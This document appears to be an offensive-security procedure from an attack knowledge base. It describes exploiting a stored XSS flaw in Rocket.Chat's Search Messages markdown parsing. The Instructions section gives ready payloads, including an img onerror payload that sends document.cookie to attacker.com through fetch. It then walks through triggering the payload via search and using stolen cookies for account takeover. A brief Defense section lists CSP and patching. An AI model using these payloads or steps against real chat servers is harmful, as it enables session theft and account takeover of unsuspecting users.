---
tags:
  - xss
  - stored-xss
  - markdown-injection
  - rocket-chat
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
platforms:
  - Web
techniques:
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 3ee6af7c-5f16-4d73-be6b-b367ca238130
created_at: '2025-12-14T03:15:53.453Z'
updated_at: '2025-12-14T03:15:53.453Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Malicious-Markdown-in-Rocket-Chat-Search-Messages

## Summary

This procedure exploits a stored Cross-Site Scripting (XSS) vulnerability in Rocket.Chat's Search Messages feature by injecting malicious HTML tags through flawed markdown parsing, allowing persistent script execution when users search for the tainted messages. It is particularly effective on instances with disabled Content Security Policy (CSP) and can lead to session hijacking or account takeover.

## Description

The vulnerability arises from improper sanitization in the markdown parser used for search messages, enabling attackers to insert executable HTML/JavaScript tags. An authenticated user can send a specially crafted message containing the payload, which is stored server-side. When any user (including admins) searches for keywords in that message, the unsanitized output renders the script in their browser context. Reported on November 22, 2022, via HackerOne (Report #1781131), this affects Rocket.Chat versions prior to patches. Prerequisites include a valid account and a target server without CSP headers. Expected outcomes include arbitrary JavaScript execution, such as stealing cookies or redirecting to phishing sites for takeover.

## Requirements

1. Authenticated access to a vulnerable Rocket.Chat instance (user-level permissions suffice)
2. Target server with disabled or weak CSP (verified via browser dev tools)
3. Web browser for injection and testing (e.g., Chrome with console open)
4. Attacker-controlled server for exfiltration (optional, for advanced payloads)

## Defense

Defensive measures and detection strategies:

- Enable strict CSP headers to block inline scripts and unauthorized domains
- Update Rocket.Chat to the latest version with markdown sanitization fixes
- Implement input validation and output encoding for all user-generated content in search features
- Monitor for anomalous JavaScript execution or unexpected network requests from chat interfaces

## Objectives

1. Store malicious payload in searchable messages to achieve persistence
2. Execute JavaScript in victim browsers upon search to steal session data
3. Facilitate account takeover by hijacking authenticated sessions

## Instructions

### Step 1: Prepare and Inject Payload

**Context**: Craft a markdown message that bypasses parsing to embed executable HTML, ensuring it stores without immediate execution.

Log in to Rocket.Chat and navigate to a public or shared channel. Compose a new message using markdown syntax to inject tags, for example:

`Test message with image: <img src="x" onerror="alert('Stored XSS Triggered')">`

Or for exfiltration: `<img src="x" onerror="fetch('http://attacker.com/steal?data='+document.cookie)">`

Send the message. The payload is now stored server-side.

> This step stores the XSS without triggering it immediately, relying on the search feature for execution.

### Step 2: Trigger Execution via Search

**Context**: Use the Search Messages feature to render the tainted content, executing the payload in the viewer's browser.

Go to the global or channel search bar. Query for a keyword from your injected message (e.g., "Test message"). View the search results, which will parse and render the markdown, executing the script if CSP is absent.

> Successful execution appears as an alert popup or a network request to your server logging stolen data. For takeover, modify the payload to submit forms or redirect with stolen tokens.

### Step 3: Verify and Escalate

**Context**: Confirm exploitation and chain to takeover if targeting a specific victim.

In your browser console, check for execution errors or use dev tools to inspect network tab for exfiltrated data. If cookies are stolen, use them in a new session to impersonate the victim, achieving account takeover.

> Expected signs: No CSP violations, script runs cleanly, and attacker gains unauthorized access.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[stored-xss]]
- [[markdown-injection]]
- [[rocket-chat]]
